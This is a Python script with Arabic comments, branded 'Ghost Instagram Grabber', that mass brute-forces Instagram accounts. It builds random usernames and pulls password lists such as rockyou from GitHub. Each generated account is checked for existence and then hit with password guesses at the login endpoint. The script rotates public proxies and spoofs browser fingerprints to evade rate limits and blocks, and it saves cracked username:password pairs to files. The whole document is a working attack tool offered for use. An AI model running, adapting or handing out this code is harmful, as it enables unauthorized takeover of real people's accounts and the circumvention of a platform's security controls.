#!/usr/bin/env python3
# insta_terminal_results.py
# أداة جلب حسابات انستغرام حقيقية - النتائج في الترمنال مباشرة

import asyncio
import aiohttp
import random
import string
import hashlib
import json
import csv
import time
import os
import re
import ssl
import sys
from datetime import datetime
from typing import List, Dict, Optional, Tuple
import logging

logging.basicConfig(level=logging.CRITICAL)
logger = logging.getLogger('ghost_terminal')
logger.disabled = True

# ==================== الألوان ====================
class Colors:
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'
    BG_MAGENTA = '\033[45m'
    BG_CYAN = '\033[46m'

def cprint(text, color=Colors.WHITE, bold=False, end='\n'):
    prefix = Colors.BOLD if bold else ''
    print(f"{prefix}{color}{text}{Colors.RESET}", end=end, flush=True)

# ==================== جلب كلمات المرور من GitHub ====================
class GitHubWordlistFetcher:
    RAW_URLS = [
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt",
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt",
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/xato-net-10-million-passwords-1000000.txt",
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/best1050.txt",
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/500-worst-passwords.txt",
        "https://raw.githubusercontent.com/drtychai/wordlists/master/fasttrack.txt",
        "https://raw.githubusercontent.com/kkrypt0nn/wordlists/main/passwords/rockyou.txt",
        "https://raw.githubusercontent.com/jeanphorn/wordlist/master/rockyou.txt",
        "https://raw.githubusercontent.com/xajkep/wordlists/master/rockyou.txt"
    ]
    
    def __init__(self):
        self.passwords = set()
    
    async def fetch_from_url(self, url: str, session: aiohttp.ClientSession) -> int:
        count = 0
        try:
            async with session.get(url, timeout=20) as response:
                if response.status == 200:
                    text = await response.text()
                    for line in text.split('\n'):
                        line = line.strip()
                        if line and len(line) >= 4 and len(line) <= 32:
                            self.passwords.add(line)
                            count += 1
        except:
            pass
        return count
    
    async def fetch_all(self) -> int:
        cprint("\n[*] جلب كلمات المرور من GitHub...", Colors.CYAN, bold=True)
        
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
        
        async with aiohttp.ClientSession(ssl=ssl_context) as session:
            tasks = [asyncio.create_task(self.fetch_from_url(url, session)) 
                    for url in self.RAW_URLS]
            results = await asyncio.gather(*tasks)
        
        total = sum(results)
        cprint(f"[+] تم جلب {len(self.passwords)} كلمة مرور فريدة من {len(results)} مصادر", Colors.GREEN)
        return len(self.passwords)

# ==================== مولّد الأسماء ====================
class UsernameGenerator:
    FIRST_NAMES = [
        "ahmed", "mohamed", "ali", "omar", "khaled", "youssef", "amine",
        "sara", "fatima", "nour", "lina", "aya", "salma", "miriam",
        "john", "mike", "sarah", "emma", "olivia", "liam", "noah",
        "carlos", "diego", "lucas", "maria", "sofia", "valentina",
        "emir", "can", "elif", "zeynep", "yusuf", "mehmet", "ayse",
        "ivan", "anna", "dmitri", "olga", "nikita", "svetlana",
        "wei", "jing", "xia", "ming", "hua", "liu", "chen",
        "james", "robert", "david", "richard", "thomas", "charles",
        "daniel", "matthew", "anthony", "steven", "paul", "mark",
        "george", "kenneth", "edward", "brian", "ronald", "timothy"
    ]
    
    LAST_NAMES = [
        "smith", "johnson", "williams", "brown", "jones", "garcia",
        "miller", "davis", "rodriguez", "martinez", "hernandez",
        "ahmed", "hassan", "ibrahim", "yilmaz", "demir", "celik",
        "wang", "li", "zhang", "chen", "yang", "huang",
        "petrov", "ivanov", "smirnov", "kuznetsov", "popov",
        "wilson", "anderson", "taylor", "thomas", "moore", "jackson",
        "martin", "lee", "perez", "thompson", "white", "harris"
    ]
    
    EXTRA_CHARS = ['', '', '', '1', '2', '3', '12', '123', '1234', 
                   '2023', '2024', '2025', '_', '.', '@', 'x', 'o', 
                   '7', '99', '007', 'official', 'real', 'the', 'its',
                   'im', 'mr', 'ms', 'xoxo', 'love', 'life']
    
    @classmethod
    def generate(cls) -> str:
        first = random.choice(cls.FIRST_NAMES)
        last = random.choice(cls.LAST_NAMES)
        extra = random.choice(cls.EXTRA_CHARS)
        
        patterns = [
            f"{first}{extra}",
            f"{first}_{last}{extra}",
            f"{first}.{last}{extra}",
            f"{first}{last}{extra}",
            f"{last}_{first}{extra}",
            f"{first}{random.randint(1,9999)}",
            f"{first}_{random.randint(1,999)}",
            f"{first}{last}{random.randint(1,99)}",
            f"{first}{last}",
            f"{first}_{last}",
            f"{first}.{last}",
            f"{first}{last}{random.randint(100,999)}"
        ]
        
        return random.choice(patterns).lower()

# ==================== مولّد تحويرات ====================
class PasswordMutator:
    COMMON_SUFFIXES = [
        "", "", "", "1", "2", "3", "12", "123", "1234", "12345",
        "123456", "!", "!!", "@", "#", "$", "2023", "2024", "2025",
        "007", "69", "99", "100", "111", "222", "777", "999", "000"
    ]
    
    REPLACEMENTS = {
        'a': '@', 'e': '3', 'i': '1', 'o': '0', 
        's': '5', 't': '7', 'b': '8', 'g': '9', 'l': '1'
    }
    
    @classmethod
    def from_username(cls, username: str) -> List[str]:
        base = username.replace('_', '').replace('.', '').replace('@', '')
        base = base.rstrip('1234567890')
        
        variants = set()
        if base:
            variants.add(base)
            variants.add(base.capitalize())
            variants.add(base.upper())
            variants.add(base.lower())
            
            for suffix in cls.COMMON_SUFFIXES[:15]:
                variants.add(f"{base}{suffix}")
                variants.add(f"{base}_{suffix}")
            
            replaced = base
            for old, new in cls.REPLACEMENTS.items():
                replaced = replaced.replace(old, new)
            variants.add(replaced)
            variants.add(f"{replaced}123")
        
        return list(variants)

# ==================== مدير البروكسيات ====================
class ProxyManager:
    DEFAULT_PROXIES = [
        "http://51.89.255.237:3128",
        "http://8.219.97.57:80",
        "http://43.153.207.93:3128",
        "http://20.235.159.154:80",
        "http://20.205.61.143:80",
        "http://13.37.89.201:80",
        "http://20.235.104.105:3729",
        "http://20.235.96.154:3729"
    ]
    
    def __init__(self):
        self.proxies = self.DEFAULT_PROXIES
        self.index = 0
    
    def get_rotating(self):
        proxy = self.proxies[self.index % len(self.proxies)]
        self.index += 1
        return proxy
    
    def count(self):
        return len(self.proxies)

# ==================== مولّد البصمات ====================
class FingerprintGenerator:
    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
    ]
    
    @classmethod
    def headers(cls) -> Dict:
        return {
            "User-Agent": random.choice(cls.USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": random.choice([
                "en-US,en;q=0.9", "ar,en;q=0.8", "tr,en;q=0.7", "fr,en;q=0.8"
            ]),
            "Accept-Encoding": "gzip, deflate, br",
            "X-WebGL-Hash": hashlib.md5(str(random.random()).encode()).hexdigest(),
            "X-Canvas-Hash": hashlib.sha256(str(random.random()).encode()).hexdigest(),
            "Cache-Control": "no-cache"
        }

# ==================== الأداة الرئيسية ====================
class TerminalInstaGrabber:
    def __init__(self, num_accounts: int = 100):
        self.num_accounts = num_accounts
        self.proxy_manager = ProxyManager()
        self.wordlist_fetcher = GitHubWordlistFetcher()
        self.wordlist = set()
        self.total_attempts = 0
        self.found_accounts = []
        self.not_found = []
        self.twofa_accounts = []
    
    async def _fetch_csrf(self, session) -> str:
        try:
            async with session.get("https://www.instagram.com/accounts/login/", timeout=15) as resp:
                if resp.status == 200:
                    cookies = session.cookie_jar._cookies
                    for domain in cookies:
                        if 'instagram.com' in domain:
                            for path in cookies[domain]:
                                for name in cookies[domain][path]:
                                    if name == 'csrftoken':
                                        return cookies[domain][path][name].value
                    
                    html = await resp.text()
                    match = re.search(r'"csrf_token":"([^"]+)"', html)
                    if match:
                        return match.group(1)
        except:
            pass
        return hashlib.md5(str(random.random()).encode()).hexdigest()[:32]
    
    async def _check_exists(self, session, username, headers, proxy) -> bool:
        try:
            url = f"https://www.instagram.com/api/v1/users/web_profile_info/?username={username}"
            async with session.get(url, headers=headers, proxy=proxy, timeout=10) as resp:
                return resp.status == 200
        except:
            return False
    
    async def _try_login(self, session, username, password, headers, proxy, csrf) -> Tuple[bool, str]:
        try:
            headers = headers.copy()
            headers.update({
                "X-CSRFToken": csrf,
                "X-Instagram-AJAX": "1",
                "X-Requested-With": "XMLHttpRequest",
                "Referer": "https://www.instagram.com/accounts/login/",
                "Content-Type": "application/x-www-form-urlencoded"
            })
            
            data = {
                'username': username,
                'enc_password': f"#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}",
                'queryParams': '{}',
                'optIntoOneTap': 'false'
            }
            
            async with session.post(
                "https://www.instagram.com/accounts/login/ajax/",
                headers=headers, data=data, proxy=proxy, timeout=15
            ) as resp:
                if resp.status == 200:
                    result = await resp.json()
                    if result.get('authenticated'):
                        return True, 'success'
                    elif result.get('two_factor_required'):
                        return False, '2fa'
                    elif result.get('message') == 'checkpoint_required':
                        return False, 'checkpoint'
                    else:
                        return False, 'wrong'
                elif resp.status == 429:
                    return False, 'rate_limited'
                elif resp.status == 403:
                    return False, 'blocked'
                else:
                    return False, 'error'
        except:
            return False, 'error'
    
    async def _crack_account(self, username: str, passwords: List[str]) -> Dict:
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
        
        headers = FingerprintGenerator.headers()
        
        async with aiohttp.ClientSession(ssl=ssl_context) as session:
            proxy = self.proxy_manager.get_rotating()
            
            # التحقق من وجود الحساب
            exists = await self._check_exists(session, username, headers, proxy)
            if not exists:
                return {'username': username, 'status': 'not_found', 'password': None}
            
            # جلب CSRF
            csrf = await self._fetch_csrf(session)
            
            # محاولة كلمات المرور
            for i, password in enumerate(passwords):
                self.total_attempts += 1
                
                if i % 5 == 0:
                    headers = FingerprintGenerator.headers()
                    proxy = self.proxy_manager.get_rotating()
                
                await asyncio.sleep(random.uniform(0.3, 1.0))
                
                success, status = await self._try_login(
                    session, username, password, headers, proxy, csrf
                )
                
                if success:
                    return {'username': username, 'status': 'success', 'password': password}
                
                if status == '2fa':
                    return {'username': username, 'status': '2fa', 'password': password}
                
                if status in ['rate_limited', 'blocked']:
                    headers = FingerprintGenerator.headers()
                    proxy = self.proxy_manager.get_rotating()
                    await asyncio.sleep(random.uniform(3, 8))
            
            return {'username': username, 'status': 'failed', 'password': None}
    
    async def run(self):
        # رأس الترمنال
        cprint("=" * 70, Colors.MAGENTA, bold=True)
        cprint("  GHOST INSTAGRAM GRABBER - TERMINAL EDITION", Colors.MAGENTA, bold=True)
        cprint("  جلب حسابات انستغرام حقيقية مع كلمات المرور", Colors.MAGENTA, bold=True)
        cprint("=" * 70, Colors.MAGENTA, bold=True)
        print()
        
        cprint(f"[+] عدد الحسابات المطلوبة: {self.num_accounts}", Colors.CYAN, bold=True)
        cprint(f"[+] البروكسيات المتاحة: {self.proxy_manager.count()}", Colors.CYAN)
        print()
        
        # جلب كلمات المرور
        await self.wordlist_fetcher.fetch_all()
        self.wordlist = self.wordlist_fetcher.passwords
        print()
        
        # توليد أسماء المستخدمين
        cprint("[*] توليد أسماء المستخدمين...", Colors.YELLOW)
        usernames = []
        while len(usernames) < self.num_accounts:
            u = UsernameGenerator.generate()
            if u not in usernames:
                usernames.append(u)
        
        cprint(f"[+] تم توليد {len(usernames)} اسم مستخدم", Colors.GREEN)
        print()
        
        # إعداد قوائم كلمات المرور
        password_lists = {}
        common = list(self.wordlist)[:3000]
        for username in usernames:
            user_pwds = PasswordMutator.from_username(username)
            combined = list(set(user_pwds + common))
            random.shuffle(combined)
            password_lists[username] = combined[:150]
        
        # شريط التقدم
        cprint("[*] بدء محاولات الاختراق...", Colors.YELLOW, bold=True)
        print()
        
        semaphore = asyncio.Semaphore(3)
        
        async def crack_with_limit(username):
            async with semaphore:
                return await self._crack_account(username, password_lists[username])
        
        # عرض التقدم المباشر
        found_count = 0
        not_found_count = 0
        twofa_count = 0
        failed_count = 0
        processed = 0
        
        tasks = [asyncio.create_task(crack_with_limit(u)) for u in usernames]
        
        for task in asyncio.as_completed(tasks):
            result = await task
            processed += 1
            
            # تنظيف السطر الحالي
            sys.stdout.write('\r' + ' ' * 100 + '\r')
            
            if result['status'] == 'success':
                found_count += 1
                self.found_accounts.append(result)
                cprint(f"[{processed}/{self.num_accounts}] ", Colors.WHITE, end='')
                cprint("✅ نجح ", Colors.GREEN, bold=True, end='')
                cprint(f"{result['username']}", Colors.WHITE, bold=True, end='')
                cprint(" : ", Colors.YELLOW, end='')
                cprint(f"{result['password']}", Colors.GREEN, bold=True)
                
            elif result['status'] == '2fa':
                twofa_count += 1
                self.twofa_accounts.append(result)
                cprint(f"[{processed}/{self.num_accounts}] ", Colors.WHITE, end='')
                cprint("🔒 2FA ", Colors.CYAN, bold=True, end='')
                cprint(f"{result['username']}", Colors.WHITE, bold=True, end='')
                cprint(" : ", Colors.YELLOW, end='')
                cprint(f"{result['password']}", Colors.CYAN, bold=True)
                
            elif result['status'] == 'not_found':
                not_found_count += 1
                self.not_found.append(result)
                cprint(f"[{processed}/{self.num_accounts}] ", Colors.WHITE, end='')
                cprint("❌ غير موجود ", Colors.RED, end='')
                cprint(f"{result['username']}", Colors.DIM)
                
            else:
                failed_count += 1
                cprint(f"[{processed}/{self.num_accounts}] ", Colors.WHITE, end='')
                cprint("❌ فشل ", Colors.YELLOW, end='')
                cprint(f"{result['username']}", Colors.DIM)
            
            # إحصائيات مباشرة
            cprint(f"    📊 نجح: {found_count} | 2FA: {twofa_count} | فشل: {failed_count} | غير موجود: {not_found_count} | محاولات: {self.total_attempts}", 
                  Colors.BLUE, bold=True)
            print()
        
        # عرض النتائج النهائية
        self._display_final_results(found_count, twofa_count, failed_count, not_found_count)
        self._save_results()
    
    def _display_final_results(self, found, twofa, failed, not_found):
        cprint("=" * 70, Colors.MAGENTA, bold=True)
        cprint("  النتائج النهائية", Colors.MAGENTA, bold=True)
        cprint("=" * 70, Colors.MAGENTA, bold=True)
        print()
        
        cprint(f"✅ الحسابات الناجحة: {found}", Colors.GREEN, bold=True)
        cprint(f"🔒 حسابات 2FA (كلمة صحيحة): {twofa}", Colors.CYAN, bold=True)
        cprint(f"❌ الحسابات الفاشلة: {failed}", Colors.YELLOW)
        cprint(f"🚫 الحسابات غير الموجودة: {not_found}", Colors.RED)
        cprint(f"📊 إجمالي المحاولات: {self.total_attempts}", Colors.WHITE, bold=True)
        print()
        
        if self.found_accounts:
            cprint("=" * 70, Colors.GREEN, bold=True)
            cprint("  الحسابات الناجحة (Username : Password)", Colors.GREEN, bold=True)
            cprint("=" * 70, Colors.GREEN, bold=True)
            for acc in self.found_accounts:
                cprint(f"  {acc['username']}", Colors.WHITE, bold=True, end='')
                cprint(" : ", Colors.YELLOW, end='')
                cprint(f"{acc['password']}", Colors.GREEN, bold=True)
            print()
        
        if self.twofa_accounts:
            cprint("=" * 70, Colors.CYAN, bold=True)
            cprint("  حسابات 2FA (Username : Password)", Colors.CYAN, bold=True)
            cprint("=" * 70, Colors.CYAN, bold=True)
            for acc in self.twofa_accounts:
                cprint(f"  {acc['username']}", Colors.WHITE, bold=True, end='')
                cprint(" : ", Colors.YELLOW, end='')
                cprint(f"{acc['password']}", Colors.CYAN, bold=True)
            print()
    
    def _save_results(self):
        # حفظ النتائج
        all_found = self.found_accounts + self.twofa_accounts
        
        if all_found:
            with open('terminal_results.txt', 'w') as f:
                for acc in all_found:
                    f.write(f"{acc['username']}:{acc['password']}\n")
            
            with open('terminal_results.json', 'w') as f:
                json.dump({
                    'found': self.found_accounts,
                    'twofa': self.twofa_accounts,
                    'total_attempts': self.total_attempts
                }, f, indent=2)
            
            cprint("[*] تم حفظ النتائج في: terminal_results.txt, terminal_results.json", 
                  Colors.BLUE, bold=True)

# ==================== نقطة الدخول ====================
def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='Ghost Terminal Instagram Grabber')
    parser.add_argument('--count', type=int, default=100, help='عدد الحسابات (الافتراضي: 100)')
    
    args = parser.parse_args()
    
    grabber = TerminalInstaGrabber(num_accounts=args.count)
    
    try:
        asyncio.run(grabber.run())
    except KeyboardInterrupt:
        cprint("\n\n[!] تم إيقاف الأداة بواسطة المستخدم", Colors.RED, bold=True)
        grabber._save_results()

if __name__ == "__main__":
    main()
